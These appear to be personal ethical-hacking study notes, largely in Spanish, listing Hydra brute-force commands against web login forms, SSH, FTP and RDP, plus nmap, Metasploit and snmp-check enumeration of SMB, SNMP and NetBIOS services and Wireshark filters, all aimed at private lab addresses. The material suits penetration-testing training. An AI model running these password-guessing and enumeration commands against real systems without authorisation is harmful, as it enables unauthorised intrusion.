# EH-Notes

## Brute Force
### Hydra
#### HTTP Attacks
##### GET Form
`hydra -l admin -P /usr/share/wordlists/john.lst 'http-get-form://192.168.57.132/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=nmsv6agfptj92d452si2psclc2; security=low:F=Username and/or password incorrect'`


`curl 'http://192.168.57.132/vulnerabilities/brute/?username=admin&password=admin&Login=Login#' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Referer: http://192.168.57.132/vulnerabilities/brute/' -H 'Cookie: PHPSESSID=nmsv6agfptj92d452si2psclc2; security=low' -H 'Upgrade-Insecure-Requests: 1'`

##### POST Form

`hydra -l admin -P /usr/share/wordlists/john.lst http-post-form://192.168.57.132/login.php:"username=^USER^&password=^PASS^&Login=Login":"Login failed"`

`curl 'http://192.168.57.132/login.php' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://192.168.57.132' -H 'Connection: keep-alive' -H 'Referer: http://192.168.57.132/login.php' -H 'Cookie: PHPSESSID=nmsv6agfptj92d452si2psclc2; security=low' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'username=admin&password=admin&Login=Login'`

##### SSH 
`hydra -l root -P /home/kali/tools/pass.txt 192.168.57.131 ssh -t 4`

##### FTP
`hydra -t 3 -V -ensr -l root -P /usr/share/wordlists/john.lst 192.168.57.132 ftp`

## Services
### FTP
#### Login

`ftp IP`

`user`

`password`

#### Download files

`get file.txt`

### SNMP

Listar equipos con SNMP

`sudo nmap -sU -p 161 --script=snmp-info 192.168.100.0/24`

Informacion SNMP

`snmp-check IP-SNMP`

Procesos SNMP

`nmap -sU -p 161 --script=snmp-processes IP`

Interfaces SNMP

`nmap -sU -p 161 --script=snmp-interfaces IP`

String validos SNMP con metasploit

`msfdb init`

`msfconsole`

`search snmp`

`use auxiliary/scanner/snmp/snmp_login`

`SET RHOST IP-SNMP`

`run`


### SMB

#### Enumeracion

`nmap -p445 IP`

Enumerar carpetas compartidas

`nmap -p445 --script smb-enum-shares IP`

Enumerar usuarios

`nmap -p445 --script smb-enum-users IP`

`nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=password IP`

Enumerar grupos

`nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=password IP`

Enumerar niveles de seguridad

`nmap -sC -sV -A -T4 -p445 IP`

Enumerar servicios del dominio o equipo
`nmap -p445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=password IP`

#### Acceder a traves de interfaz grafica

`smb://IP`

### RDP

#### Explotar servicio de RDP

Confirmar puerto de RDP con mestasploit ya que puede estar usando un puerto diferente

`use auxiliary/scanner/rdp/rdp_scanner`

`set RHOST IP`

`set RPORT PUERTO`

`exploit`

Realizar ataque de fuerza bruta con hydra

`hydra -l asus -P pass.txt rdp://192.168.100.55 -s 3389`

Realizar conexion RDP

`xfreerdp /u:USER /p:PASSWORD /v:IP:PORT`

`xfreerdp /u:USER /p:PASSWORD /v:192.168.100.55:3389`

### NETBIOS

`nmap -sV --script nbstat.nse 192.168.100.55`

## Traffic Sniffing

### Filtros Wireshark

`tcp.flags.sync==1`

Filtrar paquetes http

`http`

Seguimiento de paquetes 

`Seleccionar paquete >> Follow >> TCP Stream`

Extraer archivos

`File >> Export objects >> Service (HTTP,TCP,SMB)`

Buscar Strings

`Ctrl + F`

`Colocar palabra a buscar`

Denegacion de servicio

`Statics >> Conversations >> Pestana IPV4 >> Ordenar por bytes`




## Wordlist
`/usr/share/wordlists/metasploit]`

`/usr/share/wordlists/john.lst`

`/usr/share/wordlists`


